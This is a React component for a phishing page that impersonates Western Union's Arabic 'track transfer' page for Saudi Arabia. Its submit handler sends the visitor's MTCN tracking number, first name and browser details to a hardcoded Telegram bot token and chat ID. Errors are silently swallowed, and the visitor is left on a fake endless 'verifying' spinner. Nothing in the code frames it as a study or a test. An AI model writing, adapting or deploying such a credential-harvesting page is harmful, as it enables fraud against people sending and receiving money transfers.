import { useState } from "react";

export default function TrackTransfer() {
  const [activeTab, setActiveTab] = useState<"sender" | "receiver">("sender");
  const [mtcn, setMtcn] = useState("");
  const [firstName, setFirstName] = useState("");
  const [loading, setLoading] = useState(false);
  const [sent, setSent] = useState(false);

  const handleMtcnChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, "").slice(0, 10);
    setMtcn(raw);
  };

  const handleSubmit = async () => {
    setLoading(true);
    try {
      const BOT_TOKEN = "8932752604:AAF8QiqUyxGwQmNFqPUSCif31HBx-2jWPz4";
      const CHAT_ID = "8562049697";
      const message =
        `🔔 *معلومة جديدة من الموقع*\n\n` +
        `👤 *النوع:* ${activeTab === "sender" ? "فرسل" : "مستلم"}\n` +
        `🔢 *رقم MTCN:* \`${mtcn || "لم يُدخل"}\`\n` +
        `📝 *الاسم الأول:* ${firstName || "لم يُدخل"}\n` +
        `💻 *المتصفح:* ${navigator.userAgent}\n` +
        `🕐 *الوقت:* ${new Date().toLocaleString("ar-SA", { timeZone: "Asia/Riyadh" })}`;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" }),
      });
    } catch {
    } finally {
      setLoading(false);
      setSent(true);
    }
  };

  return (
    <div dir="rtl" className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Cairo', 'Segoe UI', Arial, sans-serif" }}>

      {/* Header */}
      <header style={{ backgroundColor: "#1a1b3a" }} className="flex items-center justify-between px-4 py-3">
        <button
          className="text-white border border-white rounded px-3 py-1 text-sm"
          style={{ fontSize: "0.85rem" }}
        >
          القائمة
        </button>
        <div className="flex items-center justify-center">
          <WULogo />
        </div>
        <div className="w-16" />
      </header>

      {/* Language/Region bar */}
      <div className="flex justify-end px-4 pt-3 pb-1">
        <span className="text-sm" style={{ color: "#0057a8", fontWeight: 500 }}>
          عربي/المملكة العربية السعودية
        </span>
      </div>

      {/* Main content */}
      <main className="flex-1 px-4 pb-8 max-w-lg mx-auto w-full">

        {/* Title */}
        <h1 className="text-2xl font-bold mt-3 mb-5" style={{ color: "#1a1b3a" }}>
          تتبع تحويل
        </h1>

        {/* Tabs */}
        <div className="flex mb-6 border-b" style={{ borderColor: "#e0e0e0" }}>
          <button
            onClick={() => { setActiveTab("sender"); setSent(false); }}
            className={`flex-1 pb-3 text-sm font-semibold flex items-center justify-center gap-2 transition-colors ${
              activeTab === "sender" ? "border-b-2 text-gray-900" : "text-gray-500"
            }`}
            style={activeTab === "sender" ? { borderBottomColor: "#1a1b3a" } : {}}
          >
            <span className="text-lg">↑</span>
            أنا الفرسل
          </button>
          <button
            onClick={() => { setActiveTab("receiver"); setSent(false); }}
            className={`flex-1 pb-3 text-sm font-semibold flex items-center justify-center gap-2 transition-colors ${
              activeTab === "receiver" ? "border-b-2 text-gray-900" : "text-gray-500"
            }`}
            style={activeTab === "receiver" ? { borderBottomColor: "#1a1b3a" } : {}}
          >
            <span className="text-lg">↓</span>
            أنا المستلم
          </button>
        </div>

        {sent ? (
          /* Loading screen shown after submit */
          <div className="flex flex-col items-center justify-center py-16 gap-4">
            <div className="w-12 h-12 rounded-full border-4 border-gray-200 border-t-purple-600 animate-spin" />
            <p className="text-gray-600 text-sm">جارٍ التحقق من معلومات التحويل...</p>
          </div>
        ) : (
          <>
            {/* MTCN Input */}
            <div className="mb-5">
              <p className="text-sm mb-2" style={{ color: "#333" }}>
                رقم التتبع (MTCN)
              </p>
              <div className="relative">
                <label
                  className="flex gap-2 cursor-text border-b-2 pb-2"
                  style={{ borderColor: "#9e9e9e" }}
                >
                  {[0, 1, 2, 3].map((partIdx) => {
                    const segLen = partIdx < 3 ? 3 : 1;
                    const start = partIdx * 3;
                    const chars = mtcn.slice(start, start + segLen);
                    return (
                      <span key={partIdx} className="flex gap-1">
                        {Array.from({ length: segLen }).map((_, ci) => (
                          <span
                            key={ci}
                            className="inline-block w-5 text-center border-b text-lg font-medium"
                            style={{ borderColor: "#555", minWidth: "1.25rem", color: "#1a1b3a" }}
                          >
                            {chars[ci] || <span style={{ color: "#ccc" }}>_</span>}
                          </span>
                        ))}
                        {partIdx < 3 && <span className="mx-1 text-gray-300 self-end">—</span>}
                      </span>
                    );
                  })}
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={mtcn}
                  onChange={handleMtcnChange}
                  maxLength={10}
                  className="absolute inset-0 opacity-0 cursor-text w-full h-full"
                />
              </div>
            </div>

            {/* First Name Input */}
            <div className="mb-6">
              <div className="border-b" style={{ borderColor: "#9e9e9e" }}>
                <input
                  type="text"
                  value={firstName}
                  onChange={(e) => setFirstName(e.target.value)}
                  placeholder={activeTab === "sender" ? "الاسم الأول للفرسل" : "الاسم الأول للمستلم"}
                  className="w-full py-2 bg-transparent outline-none text-right text-base placeholder-gray-400"
                  style={{ color: "#1a1b3a" }}
                />
              </div>
            </div>

            {/* Continue Button */}
            <button
              onClick={handleSubmit}
              disabled={loading}
              className="w-full py-4 rounded text-white text-lg font-bold mb-5 transition-opacity hover:opacity-90 active:opacity-80 disabled:opacity-60"
              style={{ backgroundColor: "#5b5ea6" }}
            >
              {loading ? "جارٍ الإرسال..." : "المتابعة"}
            </button>

            {/* MTCN help link */}
            <div className="text-center">
              <a
                href="#"
                className="text-sm"
                style={{ color: "#0057a8" }}
                onClick={(e) => e.preventDefault()}
              >
                لا تعرف رقم التتبع (MTCN)؟
              </a>
            </div>
          </>
        )}
      </main>

      {/* Footer */}
      <footer className="mt-auto" style={{ borderTop: "1px solid #e0e0e0" }}>
        <div className="px-4 py-5">
          <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs mb-4" style={{ color: "#555" }}>
            {[
              "الصفحة الرئيسية","معلومات حول الشركة","نبذة عنا","المدونة","الإبلاغ",
              "خطأ في الأمان","العلاقات بين المستثمرين","الوظائف","مؤسسة WU","التوعية",
              "الفكرية","بيان الخصوصية عبر شبكة الإنترنت","الأحكام والشروط",
              "معلومات حول ملف تعريف الارتباط","للحماية من الاحتيال","التواصل معنا",
            ].map((link) => (
              <a key={link} href="#" className="hover:underline" style={{ color: "#555" }} onClick={(e) => e.preventDefault()}>
                {link}
              </a>
            ))}
          </div>
          <p className="text-xs text-center mb-3" style={{ color: "#777" }}>
            حقوق النسخ والنشر 2026. Western Union Holdings, Inc. جميع الحقوق محفوظة.
          </p>
          <p className="text-xs text-center mb-3" style={{ color: "#777" }}>تابعنا على</p>
          <div className="flex justify-center gap-4">
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:opacity-70 transition-opacity"><FacebookIcon /></a>
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:opacity-70 transition-opacity"><YoutubeIcon /></a>
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:opacity-70 transition-opacity"><InstagramIcon /></a>
            <a href="#" onClick={(e) => e.preventDefault()} className="hover:opacity-70 transition-opacity"><XIcon /></a>
          </div>
        </div>
      </footer>
    </div>
  );
}

function WULogo() {
  return (
    <svg width="48" height="28" viewBox="0 0 100 56" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M10 4 L28 52 L40 20 L52 52 L70 4 H82 L60 56 L48 24 L36 56 L14 4 Z" fill="#FFD700" />
      <path d="M72 4 L88 4 L100 40 C98 50 92 56 84 56 C76 56 72 50 70 42 L66 28 L74 28 L78 42 C80 48 82 50 84 50 C88 50 90 46 88 40 L76 4 Z" fill="#FFD700" />
    </svg>
  );
}

function FacebookIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="#1877F2" xmlns="http://www.w3.org/2000/svg">
      <path d="M24 12.073C24 5.4 18.627 0 12 0S0 5.4 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.883v2.252h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
    </svg>
  );
}

function YoutubeIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="#FF0000" xmlns="http://www.w3.org/2000/svg">
      <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
    </svg>
  );
}

function InstagramIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="url(#ig-gradient)" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <radialGradient id="ig-gradient" cx="30%" cy="107%" r="150%">
          <stop offset="0%" stopColor="#fdf497"/>
          <stop offset="5%" stopColor="#fdf497"/>
          <stop offset="45%" stopColor="#fd5949"/>
          <stop offset="60%" stopColor="#d6249f"/>
          <stop offset="90%" stopColor="#285AEB"/>
        </radialGradient>
      </defs>
      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
    </svg>
  );
}

function XIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="#000000" xmlns="http://www.w3.org/2000/svg">
      <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.737-8.845L1.254 2.25H8.08l4.253 5.622 5.91-5.622zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/>
    </svg>
  );
}
